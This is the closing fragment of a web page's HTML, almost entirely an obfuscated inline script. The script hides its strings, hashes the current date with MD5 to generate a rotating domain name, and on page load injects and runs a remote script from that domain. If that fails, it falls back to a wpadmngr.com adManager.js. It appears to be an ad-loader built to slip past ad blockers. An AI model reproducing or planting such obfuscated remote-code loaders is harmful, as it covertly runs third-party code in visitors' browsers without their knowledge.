<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>